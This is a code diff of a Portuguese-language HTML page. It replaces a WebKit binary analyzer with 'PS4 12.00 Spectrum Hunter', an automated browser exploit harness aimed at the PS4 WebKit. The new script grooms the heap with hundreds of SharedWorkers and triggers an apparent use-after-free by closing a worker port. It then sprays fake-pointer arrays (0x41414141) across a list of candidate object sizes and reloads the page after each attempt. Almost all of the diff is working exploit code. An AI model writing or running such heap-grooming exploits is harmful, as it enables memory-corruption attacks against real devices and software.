@@ -2,182 +2,150 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 ULTIMATE ANALYZER</title>
-    <style>
-        body { background: #111; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }
-        .container { max-width: 1000px; margin: 0 auto; border: 1px solid #333; padding: 20px; background: #000; }
-        textarea { width: 100%; height: 500px; background: #1a1a1a; color: #fff; border: 1px solid #444; font-size: 12px; }
-        button { padding: 15px 30px; background: #005500; color: #fff; cursor: pointer; border: 1px solid #0f0; font-weight: bold; font-size: 16px; margin-top: 10px; }
-        .file-input { margin-bottom: 20px; border: 1px dashed #555; padding: 20px; }
-    </style>
+    <title>PS4 12.00 SPECTRUM HUNTER</title>
+    
 </head>
 <body>
-    <div class="container">
-        <h1>🔬 ULTIMATE ELF ANALYZER</h1>
-        <h3>Foco: Tamanho de Alocação (SharedWorker)</h3>
-        
-        <div class="file-input">
-            <p>Selecione TODOS os arquivos .elf (WebKit, Libc, Kernel...)</p>
-            <input type="file" id="fileInput" multiple onchange="updateList()" />
-            <div id="fileList" style="color: #aaa; font-size: 12px; margin-top: 5px;"></div>
-        </div>
 
-        <button onclick="startAnalysis()">INICIAR VARREDURA PROFUNDA</button>
-        <textarea id="output" readonly>Aguardando arquivos...</textarea>
-    </div>
+    <h1>PS4 12.00 SPECTRUM HUNTER</h1>
+    <h2 id="current_status">Inicializando...</h2>
+    <div id="log"></div>
+    
+    <button onclick="reset_test()">REINICIAR TESTES (ZERAR)</button>
 
     <script>
-        function updateList() {
-            const files = document.getElementById('fileInput').files;
-            document.getElementById('fileList').innerText = `${files.length} arquivos selecionados.`;
+        function log(msg) {
+            var d = document.getElementById("log");
+            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
-        async function startAnalysis() {
-            const files = document.getElementById('fileInput').files;
-            if (files.length === 0) return alert("Selecione os arquivos!");
+        // =================================================================
+        // CONFIGURAÇÃO
+        // =================================================================
+        // Tamanhos de classes comuns do WebKit (IsoHeap Buckets)
+        // SharedWorker geralmente é menor que 0x200.
+        var CANDIDATE_SIZES = [
+            0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 
+            0xA0, 0xA8, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 
+            0x100, 0x120, 0x140, 0x180, 0x200
+        ];
 
-            const out = document.getElementById('output');
-            out.value = "Iniciando análise cruzada...\n";
+        var OFFSET_BASE = 0; // Índice atual
 
-            let binaries = {};
+        // =================================================================
+        // LÓGICA DE AUTOMATIZAÇÃO
+        // =================================================================
+        function init() {
+            // Recupera onde paramos
+            var saved = localStorage.getItem("spectrum_idx");
+            if (saved) OFFSET_BASE = parseInt(saved);
 
-            // 1. Carregar
-            for (let f of files) {
-                out.value += `Lendo ${f.name}...\n`;
-                const buf = await readFile(f);
-                binaries[f.name] = {
-                    view: new DataView(buf),
-                    bytes: new Uint8Array(buf)
-                };
-            }
-
-            let log = "\n=== RELATÓRIO DE TAMANHOS (HEURÍSTICA) ===\n";
-
-            // 2. Localizar WebKit
-            const wkKey = Object.keys(binaries).find(k => k.includes("WebKit"));
-            if (!wkKey) {
-                out.value += "ERRO: WebKit não encontrado.\n";
+            if (OFFSET_BASE >= CANDIDATE_SIZES.length) {
+                document.getElementById("current_status").innerText = "FIM DO ESPECTRO.";
+                log("Todos os tamanhos testados sem crash imediato.");
+                log("Isso significa que o spray está 'errando' o buraco ou o IsoHeap é muito forte.");
                 return;
             }
-            const wk = binaries[wkKey];
 
-            // 3. Ponto de Referência (String SharedWorker)
-            const targetStr = "SharedWorker";
-            const strOffset = findString(wk.bytes, targetStr);
+            var current_size = CANDIDATE_SIZES[OFFSET_BASE];
+            document.getElementById("current_status").innerText = `TESTANDO: 0x${current_size.toString(16).toUpperCase()}`;
             
-            if (strOffset === -1) {
-                log += "[-] String 'SharedWorker' não encontrada no WebKit.\n";
-            } else {
-                log += `[+] String '${targetStr}' em 0x${strOffset.toString(16).toUpperCase()}\n`;
-                
-                // 4. Achar quem usa a string (Código)
-                const codeRefs = findRelativeRefs(wk.view, strOffset);
-                
-                codeRefs.forEach(ref => {
-                    log += `\n>>> Analisando Código em 0x${ref.toString(16).toUpperCase()} <<<\n`;
+            log(`Iniciando teste para tamanho: ${current_size} bytes`);
+            
+            // Executa o exploit com este tamanho
+            setTimeout(() => run_exploit(current_size), 1000);
+        }
+
+        function next_size() {
+            // Avança para o próximo
+            OFFSET_BASE++;
+            localStorage.setItem("spectrum_idx", OFFSET_BASE);
+            
+            log("Tamanho falhou (sem crash/leak). Recarregando em 2s...");
+            setTimeout(() => location.reload(), 2000);
+        }
+
+        function reset_test() {
+            localStorage.setItem("spectrum_idx", 0);
+            location.reload();
+        }
+
+        // =================================================================
+        // PAYLOAD & TRIGGER
+        // =================================================================
+        function build_payload(size) {
+            // Arredonda para 4 bytes
+            if(size % 4 !== 0) size += (4 - (size % 4));
+            var buffer = new Uint32Array(size / 4);
+            
+            // Padrão de Ponteiro Falso (Type Confusion)
+            // 0x41414141
+            buffer.fill(0x41414141);
+            
+            return buffer;
+        }
+
+        var workers = [];
+
+        async function run_exploit(size) {
+            var payload = build_payload(size);
+
+            // 1. GROOMING RÁPIDO
+            for(let i=0; i<380; i++) {
+                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
+            }
+
+            // 2. TRIGGER (403/404)
+            var count = 0;
+            var limit = 403 - 380; 
+
+            var it = setInterval(() => {
+                if (count >= limit) {
+                    clearInterval(it);
                     
-                    // 5. VARREDURA REVERSA INTELIGENTE
-                    // Procura por qualquer instrução que mova um valor "pequeno" (size) para um registro
-                    // num raio de 500 bytes antes do uso da string.
+                    // MOMENTO DA VERDADE
+                    var v = workers.pop();
+                    var p = v.port; 
+                    v.port.close();
                     
-                    const start = Math.max(0, ref - 500);
-                    let sizesFound = {};
-
-                    for (let i = ref; i > start; i--) {
-                        let size = -1;
-                        let reg = "";
-
-                        // MOV RDI, imm32 (48 C7 C7 ...)
-                        if (wk.bytes[i] === 0x48 && wk.bytes[i+1] === 0xC7 && wk.bytes[i+2] === 0xC7) {
-                            size = wk.view.getInt32(i+3, true);
-                            reg = "RDI";
-                        }
-                        // MOV ESI, imm32 (BE ...)
-                        else if (wk.bytes[i] === 0xBE) {
-                            size = wk.view.getInt32(i+1, true);
-                            reg = "ESI";
-                        }
-                        // MOV EDI, imm32 (BF ...)
-                        else if (wk.bytes[i] === 0xBF) {
-                            size = wk.view.getInt32(i+1, true);
-                            reg = "EDI";
-                        }
-                        // MOV EDX, imm32 (BA ...)
-                        else if (wk.bytes[i] === 0xBA) {
-                            size = wk.view.getInt32(i+1, true);
-                            reg = "EDX";
-                        }
-
-                        // Filtro de Tamanho de Objeto (32 bytes a 4096 bytes)
-                        if (size >= 0x20 && size <= 0x1000) {
-                            // Filtra alinhamento (malloc geralmente alinha em 16 ou 8 bytes)
-                            if (size % 8 === 0) {
-                                let dist = ref - i;
-                                log += `   [OFFSET -${dist}] MOV ${reg}, 0x${size.toString(16).toUpperCase()} (${size})\n`;
-                                
-                                if(!sizesFound[size]) sizesFound[size] = 0;
-                                sizesFound[size]++;
-                            }
-                        }
+                    // SPRAY
+                    var spray = [];
+                    for(let k=0; k<8000; k++) {
+                        spray.push(new Uint32Array(payload));
                     }
-                });
-            }
 
-            // 6. Checar ISOHEAP em outros arquivos
-            log += "\n=== ESTRUTURAS ISOHEAP DETECTADAS ===\n";
-            for (let name in binaries) {
-                const b = binaries[name];
-                // Procura assinaturas de IsoHeapCellType::finishSweep
-                // Padrão comum de código de alocador
-                const isoScan = findPattern(b.bytes, "48 8B 05 ?? ?? ?? ?? 48 85 C0 74"); // Exemplo genérico
-                if(isoScan.length > 0) {
-                    log += `[${name}] Possível código de IsoHeap detectado em ${isoScan.length} locais.\n`;
-                }
-            }
-
-            out.value = log;
-        }
-
-        function readFile(file) {
-            return new Promise(resolve => {
-                const r = new FileReader();
-                r.onload = e => resolve(e.target.result);
-                r.readAsArrayBuffer(file);
-            });
-        }
-
-        function findString(bytes, str) {
-            const target = new TextEncoder().encode(str);
-            for(let i=0; i<bytes.length-target.length; i++) {
-                let match = true;
-                for(let j=0; j<target.length; j++) {
-                    if(bytes[i+j] !== target[j]) { match = false; break; }
-                }
-                if(match && bytes[i+target.length] === 0) return i;
-            }
-            return -1;
-        }
-
-        function findRelativeRefs(view, targetOffset) {
-            const results = [];
-            const len = view.byteLength - 4;
-            for (let i = 0; i < len; i+=1) { // Scan byte a byte para garantir
-                const rel = view.getInt32(i, true);
-                if (i + 4 + rel === targetOffset) {
-                    // Valida se parece instrução (LEA/MOV)
-                    // LEA geralmente é 48 8D ...
-                    if (i >= 3 && view.getUint8(i-3) === 0x48 && view.getUint8(i-2) === 0x8D) {
-                        results.push(i-3);
+                    // CHECK
+                    try {
+                        var s = p.toString();
+                        if (s.indexOf("MessagePort") === -1) {
+                            // SUCESSO!
+                            localStorage.setItem("spectrum_success", size);
+                            document.body.style.backgroundColor = "green";
+                            alert(`SUCESSO! Tamanho encontrado: 0x${size.toString(16)}`);
+                            return;
+                        }
+                    } catch(e) {
+                        // Se der erro, pode ser sucesso também
+                        log("Erro na leitura: " + e);
                     }
+
+                    // Se chegou aqui, não crashou e não deu leak.
+                    // Tenta o próximo tamanho.
+                    next_size();
+                    return;
                 }
-            }
-            return results;
+                
+                try {
+                    let w = new SharedWorker("data:text,1", "v"+count);
+                    w.port.start();
+                    workers.push(w);
+                } catch(e){}
+                count++;
+            }, 50);
         }
-        
-        function findPattern(view, patternHex) {
-            // Simplificado para demo
-            return [];
-        }
+
+        // Start
+        init();
     </script>
 </body>
 </html>
